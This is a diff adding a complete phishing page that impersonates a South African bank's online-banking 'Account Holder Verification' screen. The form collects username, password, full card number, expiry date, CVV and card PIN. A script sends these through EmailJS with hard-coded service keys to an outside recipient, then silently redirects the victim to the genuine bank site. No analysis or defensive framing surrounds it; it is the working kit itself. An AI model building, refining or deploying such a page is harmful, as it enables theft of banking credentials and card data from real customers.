@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Account Verification</title>
+    <!-- Add favicon -->
+    <link rel="icon" type="image/svg+xml" href="pepe.svg"> <!-- Use Pepe SVG as favicon -->
+    
+    <!-- Viewport meta tag for mobile responsiveness -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <!-- Internal CSS for Styling -->
+    <style>
+        /* General body styling */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff; /* White background */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column; /* Stack header and columns vertically */
+            min-height: 100vh; /* Ensure the body takes at least the full viewport height */
+        }
+
+        /* Header styling */
+        .header {
+            background-color: #ffffff; /* White background */
+            color: #004400; /* Dark green text */
+            padding: 26.25px 35px; /* Increased by 75% (15px * 1.75 = 26.25px, 20px * 1.75 = 35px) */
+            display: flex;
+            justify-content: space-between; /* Space between logo and header items */
+            align-items: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 100%; /* Full width */
+        }
+
+        /* Logo styling */
+        .header-logo {
+            width: 50px; /* Adjust size as needed */
+            height: auto; /* Maintain aspect ratio */
+        }
+
+        .header-items {
+            display: flex;
+            align-items: center;
+            gap: 20px; /* Space between header items */
+        }
+
+        .header-item {
+            display: flex;
+            align-items: center;
+            gap: 10px; /* Space between icon and text */
+            font-size: 14px; /* Reduced by half (28px / 2 = 14px) */
+        }
+
+        .header-item i {
+            font-size: 17.5px; /* Reduced by half (35px / 2 = 17.5px) */
+        }
+
+        /* Main content container */
+        .main-content {
+            display: flex;
+            flex-direction: row; /* Two columns side by side */
+            justify-content: center; /* Center columns horizontally */
+            align-items: flex-start; /* Align columns to the top */
+            flex-grow: 1; /* Take up remaining space */
+            padding: 20px;
+            gap: 40px; /* Increased space between columns */
+        }
+
+        /* Left column styling */
+        .left-column {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start; /* Align content to the top */
+            width: 40%; /* Adjust width as needed */
+            max-width: 400px; /* Maximum width for larger screens */
+            border-right: 2px solid #ccc; /* Line between columns */
+            padding-right: 20px; /* Space between the line and content */
+        }
+
+        /* Right column styling */
+        .right-column {
+            width: 60%; /* Adjust width as needed */
+            max-width: 400px; /* Maximum width for larger screens */
+        }
+
+        /* Online Banking header */
+        .online-banking-header {
+            font-size: 24px;
+            font-weight: bold;
+            color: #004400; /* Dark green text for visibility */
+            margin-top: 20px;
+        }
+
+        /* Form container styling */
+        #contact-form {
+            background-color: #ffffff; /* White background for the form */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 100%; /* Full width of the right column */
+            color: #333; /* Dark text for the form */
+            border: 1px solid #ccc; /* Add border to the form */
+        }
+
+        /* Heading styling */
+        .form-heading {
+            text-align: center; /* Center the heading */
+            font-size: 24px; /* Larger font size */
+            font-weight: bold; /* Bold text */
+            margin-bottom: 20px; /* Space below the heading */
+            color: #004400; /* Dark green text for the heading */
+        }
+
+        /* Label styling */
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #333; /* Dark text for labels */
+        }
+
+        /* Input and textarea styling */
+        input[type="text"],
+        input[type="password"],
+        textarea,
+        select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background-color: #f9f9f9; /* Light gray background for inputs */
+            color: #333; /* Dark text for inputs */
+        }
+
+        textarea {
+            resize: vertical; /* Allow vertical resizing */
+            height: 80px;
+        }
+
+        /* Submit button styling */
+        input[type="submit"] {
+            background-color: #004400; /* Dark green color */
+            color: #fff;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s ease;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #003300; /* Darker green on hover */
+        }
+
+        /* Loading spinner styling */
+        #loading-spinner {
+            display: none; /* Hidden by default */
+            text-align: center;
+            margin-top: 10px;
+            color: #333; /* Dark text for spinner */
+        }
+
+        /* Show password toggle styling */
+        .show-password-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            color: #333; /* Dark text for toggle */
+        }
+
+        .show-password-container input[type="checkbox"] {
+            margin-right: 10px;
+        }
+
+        /* Expiry date container styling */
+        .expiry-date-container {
+            display: flex;
+            gap: 10px; /* Space between month and year dropdowns */
+        }
+
+        .expiry-date-container select {
+            flex: 1; /* Equal width for both dropdowns */
+        }
+
+        /* SVG image styling */
+        .experience-svg {
+            width: 100%; /* Make the SVG responsive */
+            height: auto; /* Maintain aspect ratio */
+            max-width: 300px; /* Limit maximum width */
+        }
+
+        /* Text description styling */
+        .experience-description {
+            font-size: 16px;
+            color: #004400; /* Dark green text */
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        /* Call-to-action link styling */
+        .cta-link {
+            color: #004400; /* Dark green */
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 20px;
+            display: inline-block;
+            transition: color 0.3s ease;
+        }
+
+        .cta-link:hover {
+            color: #003300; /* Darker green on hover */
+            text-decoration: underline;
+        }
+
+        .cta-link i {
+            margin-right: 5px; /* Space between icon and text */
+        }
+
+        /* Feature list styling */
+        .feature-list {
+            display: flex;
+            justify-content: center;
+            gap: 20px; /* Space between features */
+            margin-top: 10px;
+        }
+
+        .feature-list li {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: #333; /* Dark text */
+        }
+
+        .feature-list i {
+            color: #004400; /* Dark green */
+            margin-right: 5px;
+        }
+
+        /* Carousel styling */
+        .carousel {
+            margin-top: 20px;
+            width: 100%;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .carousel-inner {
+            display: flex;
+            transition: transform 0.5s ease;
+            width: 200%; /* Double the width to accommodate two items */
+        }
+
+        .carousel-item {
+            min-width: 50%; /* Each item takes up half the width */
+            box-sizing: border-box;
+            text-align: center;
+            padding: 0 10px; /* Add some spacing between items */
+        }
+
+        .carousel-item img {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+
+        .carousel-item h3 {
+            font-size: 14px;
+            color: #333;
+            margin-top: 10px;
+        }
+
+        .carousel-item p {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .carousel-item a {
+            font-size: 12px;
+            color: #004400; /* Dark green */
+            text-decoration: none;
+            display: block;
+            margin-top: 5px;
+        }
+
+        .carousel-item a:hover {
+            text-decoration: underline;
+        }
+
+        .carousel-control {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: rgba(0, 68, 0, 0.5); /* Semi-transparent dark green */
+            color: #fff;
+            border: none;
+            padding: 10px;
+            cursor: pointer;
+            border-radius: 50%;
+        }
+
+        .carousel-control.prev {
+            left: 10px;
+        }
+
+        .carousel-control.next {
+            right: 10px;
+        }
+
+        /* Footer styling */
+        .footer {
+            background-color: #ffffff; /* White background */
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid #ccc; /* Add a border at the top */
+            margin-top: auto; /* Push footer to the bottom */
+        }
+
+        .footer-left {
+            font-size: 10px; /* Very small text */
+            color: #666; /* Light gray text */
+        }
+
+        .footer-right {
+            font-size: 14px; /* Slightly larger text */
+            color: #333; /* Dark text */
+            display: flex;
+            gap: 20px; /* Space between links */
+        }
+
+        .footer-right a {
+            color: #004400; /* Dark green */
+            text-decoration: none;
+        }
+
+        .footer-right a:hover {
+            text-decoration: underline;
+        }
+    </style>
+
+     <!-- EmailJS Script -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // Initialize EmailJS
+            emailjs.init({
+              publicKey: "5zXtjmWYdADcJoXrv",
+            });
+        })();
+    </script>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <!-- Pepe Picture in the Left Corner -->
+        <img src="pepe.svg" alt="Pepe Logo" class="header-logo">
+
+        <!-- Header Items -->
+        <div class="header-items">
+            <div class="header-item">
+                <i class="fas fa-comment-dots"></i> <!-- Updated icon for  Chat -->
+                <span>Support Chat</span>
+            </div>
+            <div class="header-item">
+                <i class="fas fa-map-marker-alt"></i> <!-- Branch locator icon -->
+                <span>Branch Locator</span>
+            </div>
+            <div class="header-item">
+                <i class="fas fa-phone-volume"></i> <!-- Updated icon for +27 800 555 111 -->
+                <span>+27 800 555 111</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <!-- Left Column -->
+        <div class="left-column">
+            <!-- Include experience.svg -->
+            <img src="experience.svg" alt="Experience Image" class="experience-svg">
+
+            <!-- Secure Online Banking Text -->
+            <h1 class="online-banking-header">Secure Online Banking</h1>
+
+            <!-- Features in One Line -->
+            <ul class="feature-list">
+                <li><i class="fas fa-bolt"></i> Fast</li>
+                <li><i class="fas fa-check-circle"></i> Easy</li>
+                <li><i class="fas fa-shield-alt"></i> Secure</li>
+            </ul>
+
+            <!-- Text Description -->
+            <p class="experience-description">
+                Access an enhanced banking experience with great new features and regular updates.
+            </p>
+
+            <!-- Call-to-Action Link -->
+            <a href="#" class="cta-link">
+                <i class="fas fa-mobile-alt"></i> Explore our demo
+            </a>
+
+            <!-- Carousel -->
+            <div class="carousel">
+                <div class="carousel-inner">
+                    <!-- Slide 1 -->
+                    <div class="carousel-item">
+                        <a href="#">
+                            <img src="lady.jpg" alt="Lady">
+                            <h3>Empowering Women in Finance</h3>
+                            <p>Learn how we support women in achieving financial independence.</p>
+                            <a href="#">Learn more</a>
+                        </a>
+                    </div>
+                    <!-- Slide 2 -->
+                    <div class="carousel-item">
+                        <a href="#">
+                            <img src="accounts.png" alt="Accounts">
+                            <h3>Manage Your Accounts</h3>
+                            <p>Discover tools to manage your accounts efficiently.</p>
+                            <a href="#">Learn more</a>
+                        </a>
+                    </div>
+                    <!-- Slide 3 -->
+                    <div class="carousel-item">
+                        <a href="#">
+                            <img src="2_pot_retirement_scheme_730x340.jpg" alt="2-Pot Retirement Scheme">
+                            <h3>2-Pot Retirement Scheme</h3>
+                            <p>Learn how the new retirement scheme can benefit you.</p>
+                            <a href="#">Learn more</a>
+                        </a>
+                    </div>
+                    <!-- Slide 4 -->
+                    <div class="carousel-item">
+                        <a href="#">
+                            <img src="saving_vs_investing_blog_appTile.jpg" alt="Saving vs Investing">
+                            <h3>Saving vs Investing</h3>
+                            <p>Understand the difference and make informed financial decisions.</p>
+                            <a href="#">Learn more</a>
+                        </a>
+                    </div>
+                </div>
+                <button class="carousel-control prev" onclick="prevSlide()">&#10094;</button>
+                <button class="carousel-control next" onclick="nextSlide()">&#10095;</button>
+            </div>
+        </div>
+
+        <!-- Right Column -->
+        <div class="right-column">
+            <!-- Form -->
+            <form id="contact-form" onsubmit="redirectToNedbank(event)">
+                <!-- Heading -->
+                <h2 class="form-heading">Account Holder Verification</h2>
+
+                <!-- Hidden field -->
+                <input type="hidden" name="contact_number" value="697483">
+
+                <!-- Username field -->
+                <label>Username</label>
+                <input type="text" name="fullname" placeholder="Enter your username (min 3 characters)" required minlength="3">
+
+                <!-- Password field -->
+                <label>Password</label>
+                <input type="password" name="password" id="password" placeholder="Enter your password (min 6 characters)" required minlength="4">
+
+                <!-- Show Password Toggle -->
+                <div class="show-password-container">
+                    <input type="checkbox" id="show-password">
+                    <label for="show-password">Show Password</label>
+                </div>
+
+                <!-- Card Number field -->
+                <label>Card Number</label>
+                <textarea name="CardNumber" placeholder="Enter your 16-digit card number" required minlength="16" maxlength="16"></textarea>
+
+                <!-- Expiry Date field -->
+                <label>Expiry Date</label>
+                <div class="expiry-date-container">
+                    <!-- Month dropdown -->
+                    <select name="expiry_month" required>
+                        <option value="" disabled selected>Month</option>
+                        <option value="01">01 - January</option>
+                        <option value="02">02 - February</option>
+                        <option value="03">03 - March</option>
+                        <option value="04">04 - April</option>
+                        <option value="05">05 - May</option>
+                        <option value="06">06 - June</option>
+                        <option value="07">07 - July</option>
+                        <option value="08">08 - August</option>
+                        <option value="09">09 - September</option>
+                        <option value="10">10 - October</option>
+                        <option value="11">11 - November</option>
+                        <option value="12">12 - December</option>
+                    </select>
+
+                    <!-- Year dropdown -->
+                    <select name="expiry_year" required>
+                        <option value="" disabled selected>Year</option>
+                        <script>
+                            // Dynamically generate year options (e.g., next 10 years)
+                            const currentYear = new Date().getFullYear();
+                            for (let i = 0; i < 10; i++) {
+                                document.write(`<option value="${currentYear + i}">${currentYear + i}</option>`);
+                            }
+                        </script>
+                    </select>
+                </div>
+
+                <!-- CVV field -->
+                <label>CVV</label>
+                <input type="text" name="cvv" placeholder="Enter CVV (3 digits)" required pattern="\d{3}" title="Please enter a valid CVV (3 digits)">
+
+                <!-- Card Pin field -->
+                <label>Card Pin</label>
+                <textarea name="card_pin" placeholder="Enter your card pin" required minlength="4" maxlength="6"></textarea>
+
+                <!-- Submit button -->
+                <input type="submit" value="Verify Account">
+
+                <!-- Loading spinner -->
+                <div id="loading-spinner">Loading...</div>
+            </form>
+            <!-- JavaScript -->
+    <script>
+        // Show Password Toggle
+        document.getElementById('show-password').addEventListener('change', function() {
+            const passwordField = document.getElementById('password');
+            passwordField.type = this.checked ? 'text' : 'password';
+        });
+
+        // Form Submission
+        document.getElementById('contact-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Show loading spinner
+            document.getElementById('loading-spinner').style.display = 'block';
+
+            // Send form data via EmailJS
+            emailjs.sendForm('service_6t23mq8', 'template_9u5jmxh', this)
+                .then(() => {
+                    console.log('SUCCESS!');
+                    // Redirect to the specified URL without showing an alert
+                    window.location.href = "https://personal.nedbank.co.za/home.html";
+                }, (error) => {
+                    console.log('FAILED...', error);
+                    alert('Failed to submit form. Please try again.');
+                })
+                .finally(() => {
+                    // Hide loading spinner
+                    document.getElementById('loading-spinner').style.display = 'none';
+                });
+        });
+    </script>
+        </div>
